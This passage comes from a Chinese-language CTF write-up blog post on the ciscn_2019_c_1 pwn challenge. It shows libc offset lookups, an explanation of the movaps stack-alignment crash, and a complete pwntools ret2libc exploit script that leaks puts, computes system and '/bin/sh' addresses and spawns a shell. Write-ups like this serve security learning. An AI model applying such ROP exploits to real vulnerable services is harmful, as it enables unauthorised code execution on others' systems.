+</span></span><span class=line><span class=cl>   609: 000000000004f420    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+</span></span><span class=line><span class=cl>  1406: 000000000004f420    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 查看/bin/sh字符串在libc中的偏移
+</span></span><span class=line><span class=cl>wlupus@VM-4-10-ubuntu:~/pwn$ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep &#34;/bin/sh&#34;
+</span></span><span class=line><span class=cl> 1b3d88 /bin/sh
+</span></span></code></pre></td></tr></table></div></div><p>综合上述内容，构造payload2为<code>b'\0' + b'a' * (offset - 1) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</code></p><h2 id=3-栈平衡>3 栈平衡</h2><p>但是按照上述方法运行exp脚本时，会发现无法拿到shell。用gdb查看程序，发现程序在一条<code>movaps</code>指令处发生了段错误。<figure><a class=lightgallery href=/writeup_ciscn_2019_c_1/movaps.png title=/writeup_ciscn_2019_c_1/movaps.png data-thumbnail=/writeup_ciscn_2019_c_1/movaps.png data-sub-html="<h2>SIGSEGV</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=movaps.png data-srcset="/writeup_ciscn_2019_c_1/movaps.png, movaps.png 1.5x, /writeup_ciscn_2019_c_1/movaps.png 2x" data-sizes=auto alt=/writeup_ciscn_2019_c_1/movaps.png></a><figcaption class=image-caption>SIGSEGV</figcaption></figure>经过查看资料，发现<code>movaps</code>指令需要16字节对齐，但是图中<code>$rsp + 0x40</code>的值明显不满足对齐。因此，需要让rsp加8来实现栈平衡。实现上，往栈里多写入一个ret指令即可。最终exp如下(exp中libc偏移均为个人环境偏移，需要根据个人和靶场环境来更改)：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ciscn_2019_c_1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># sh = remote(&#39;node4.buuoj.cn&#39;, 26578)</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./ciscn_2019_c_1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># gdb.attach(sh, &#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#     b *0x400ad6 </span>
+</span></span><span class=line><span class=cl><span class=c1>#     b *0x4009cc</span>
+</span></span><span class=line><span class=cl><span class=c1># &#39;&#39;&#39;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=nb>id</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;choice!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>id</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;encrypted</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=mh>0x58</span>
+</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400c83</span>
+</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts_plt_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 0x4006e0</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts_got_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 0x602000 + 0x20 = 0x602020</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;main: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>start</span><span class=p>)</span><span class=si>}</span><span class=se>\n</span><span class=s2>plt: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>puts_plt_addr</span><span class=p>)</span><span class=si>}</span><span class=se>\n</span><span class=s2>got: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>puts_got_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=n>offset</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_plt_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>start</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;puts address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># libc = LibcSearcher(&#39;puts&#39;, puts_addr)</span>
+</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=mh>0x80970</span>
+</span></span><span class=line><span class=cl>    <span class=c1># get system addr</span>
+</span></span><span class=line><span class=cl>    <span class=c1># libc = puts_addr - 0x067970</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;libc address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>system_addr</span> <span class=o>=</span> <span class=mh>0x4f420</span> <span class=o>+</span> <span class=n>libc_base</span>
+</span></span><span class=line><span class=cl>    <span class=n>str_bin_sh</span> <span class=o>=</span>  <span class=mh>0x1b3d88</span> <span class=o>+</span> <span class=n>libc_base</span>
+</span></span><span class=line><span class=cl>    <span class=c1># second time</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;encrypted</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ret_gadget</span> <span class=o>=</span> <span class=mh>0x4006b9</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=n>offset</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_gadget</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>str_bin_sh</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="2023-03-07 15:01:33">更新于 2023-03-07&nbsp;<a class=git-hash href=https://github.com/wlupus/wlupus.github.io/commit/a90ec9057481cfff8cfe4c0251cb68c0476368cc rel="external nofollow noopener noreffer" target=_blank title="commit by Reload(wlupus@MacBookPro.local) a90ec9057481cfff8cfe4c0251cb68c0476368cc: add ciscn_2019_c writeup">
+<i class="fas fa-hashtag fa-fw"></i>a90ec90</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/writeup_ciscn_2019_c_1/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://wlupus.github.io/writeup_ciscn_2019_c_1/ data-title="Ciscn_2019_c_1 Writeup" data-via=wlupus1 data-hashtags=pwn,CTF,栈溢出><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://wlupus.github.io/writeup_ciscn_2019_c_1/ data-hashtag=pwn><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://wlupus.github.io/writeup_ciscn_2019_c_1/ data-title="Ciscn_2019_c_1 Writeup"><i data-svg-src=/lib/simple-icons/icons/line.min.svg></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/>栈溢出</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/qemu_tutorial/ class=prev rel=prev title=使用QEMU创建Linux虚拟机><i class="fas fa-angle-left fa-fw"></i>使用QEMU创建Linux虚拟机</a></div></div></article></main><footer class=footer><div class=footer-container><div class="footer-line copyright"><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>
+<a href=https://wlupus.github.io target=_blank rel="external nofollow noopener noreffer">wlupus</a></span><span class=footer-divider></span><span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=stylesheet href=/lib/katex/copy-tex.min.css><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js async defer></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js defer></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js defer></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js defer></script><script type=text/javascript src=/lib/sharer/sharer.min.js async defer></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/lib/cookieconsent/cookieconsent.min.js defer></script><script type=text/javascript src=/lib/pangu/pangu.min.js defer></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",editLockTitle:"锁定可编辑代码块",editUnLockTitle:"解锁可编辑代码块",editable:!0,maxShownLines:10},comment:{},cookieconsent:{content:{dismiss:"同意",link:"了解更多",message:"本网站使用 Cookies 来改善您的浏览体验."},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},enablePWA:!0,enablePangu:!0,lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js defer></script><script type=text/javascript src=/js/_custom.min.js defer></script></body></html>
